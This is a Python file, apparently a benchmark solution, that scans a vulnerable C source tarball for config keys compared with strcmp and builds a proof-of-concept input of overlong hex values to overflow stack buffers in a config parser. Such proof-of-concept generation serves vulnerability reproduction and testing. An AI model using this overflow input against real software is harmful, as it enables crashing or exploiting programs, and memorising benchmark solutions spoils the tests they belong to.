import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        try:
            files = self._read_source_files(src_path)
            keys = self._extract_config_keys(files)
            poc = self._build_poc(keys)
            return poc
        except Exception:
            # Fallback: generic PoC if anything goes wrong during analysis
            return self._build_poc([])

    def _read_source_files(self, src_path):
        files = []
        try:
            with tarfile.open(src_path, "r:*") as tar:
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name
                    if not any(
                        name.endswith(ext)
                        for ext in (
                            ".c",
                            ".h",
                            ".cpp",
                            ".cc",
                            ".cxx",
                            ".hpp",
                            ".hxx",
                            ".txt",
                            ".conf",
                            ".ini",
                        )
                    ):
                        continue
                    f = tar.extractfile(member)
                    if not f:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        text = data.decode("latin1", "ignore")
                    files.append((name, text))
        except Exception:
            # If we cannot read the tarball for any reason, return empty list
            return []
        return files

    def _is_reasonable_key(self, s: str) -> bool:
        if not (1 <= len(s) <= 40):
            return False
        if any(c.isspace() for c in s):
            return False
        # Disallow obviously non-key chars
        disallowed_chars = set("%/\\{}[]()#\"'|?<>")
        if any(c in disallowed_chars for c in s):
            return False
        # Must contain at least one letter
        if not any(c.isalpha() for c in s):
            return False
        return True

    def _key_keyword_score(self, s: str) -> int:
        if not self._is_reasonable_key(s):
            return -1000
        score = 1
        ls = s.lower()
        if "=" in s or ":" in s:
            score += 1
        keywords = [
            "hex",
            "mac",
            "addr",
            "address",
            "id",
            "uuid",
            "guid",
            "key",
            "token",
            "hash",
            "digest",
            "serial",
            "color",
            "rgb",
            "rgba",
            "checksum",
            "sig",
            "signature",
            "data",
            "value",
        ]
        for kw in keywords:
            if kw in ls:
                score += 2
        return score

    def _extract_config_keys(self, files):
        lit_scores = {}
        for path, text in files:
            lower = text.lower()
            file_bonus = 0
            pl = path.lower()
            if "config" in pl or "config" in lower:
                file_bonus += 2
            if "hex" in lower:
                file_bonus += 1
            if "isxdigit" in lower or "strtol" in lower or "strtoul" in lower or "sscanf" in lower:
                file_bonus += 1

            # strcmp / strcasecmp patterns
            strcmp_patterns = [
                r'str(?:case)?cmp\s*\(\s*[^,]+?\s*,\s*"([^"]+)"\s*\)',
                r'str(?:case)?cmp\s*\(\s*"([^"]+)"\s*,\s*[^,]+?\s*\)',
            ]
            for pattern in strcmp_patterns:
                for m in re.finditer(pattern, text):
                    s = m.group(1)
                    base = self._key_keyword_score(s)
                    if base > -100:
                        score = file_bonus + base
                        prev = lit_scores.get(s)
                        if prev is None or score > prev:
                            lit_scores[s] = score

            # strncmp / strncasecmp patterns
            strncmp_patterns = [
                r'strn(?:case)?cmp\s*\(\s*[^,]+?\s*,\s*"([^"]+)"\s*,\s*[0-9]+\s*\)',
                r'strn(?:case)?cmp\s*\(\s*"([^"]+)"\s*,\s*[^,]+?\s*,\s*[0-9]+\s*\)',
            ]
            for pattern in strncmp_patterns:
                for m in re.finditer(pattern, text):
                    s = m.group(1)
                    base = self._key_keyword_score(s)
                    if base > -100:
                        score = file_bonus + base + 1  # prefix matches slightly preferred
                        prev = lit_scores.get(s)
                        if prev is None or score > prev:
                            lit_scores[s] = score

        # Sort keys by descending score and keep only positive-scored ones
        sorted_keys = [k for k, sc in sorted(lit_scores.items(), key=lambda x: -x[1]) if sc > 0]
        return sorted_keys

    def _build_poc(self, keys):
        # Length of hex string per attempt; large enough to overflow typical small stack buffers
        hex_len = 800
        # Construct a hex string pattern
        hex_pattern = "CAFEBABE"
        hex_str = (hex_pattern * ((hex_len // len(hex_pattern)) + 2))[:hex_len]

        lines = []

        # A bare hex line in case the parser expects a pure hex value
        lines.append(hex_str)

        # Fallback keys if analysis didn't find any
        if not keys:
            keys = ["hex", "key", "data", "value", "addr", "address", "mac", "id"]

        # Limit the number of keys to keep PoC size moderate
        max_keys = 10
        keys = keys[:max_keys]

        for key in keys:
            prefixes = []
            if any(ch in "=:" for ch in key):
                # Key already includes separator
                prefixes.append(key)
            else:
                # Try both "key=" and "key " styles
                prefixes.append(key + "=")
                prefixes.append(key + " ")
            # Deduplicate prefixes while preserving order
            seen = set()
            unique_prefixes = []
            for p in prefixes:
                if p not in seen:
                    seen.add(p)
                    unique_prefixes.append(p)
            for p in unique_prefixes:
                lines.append(p + hex_str)

        # Add a line with explicit 0x prefix for the primary key
        if keys:
            primary = keys[0]
            if any(ch in "=:" for ch in primary):
                pref = primary
            else:
                pref = primary + "="
            lines.insert(1, pref + "0x" + hex_str)

        content = "\n".join(lines) + "\n"
        try:
            return content.encode("ascii", "ignore")
        except Exception:
            return content.encode("utf-8", "ignore")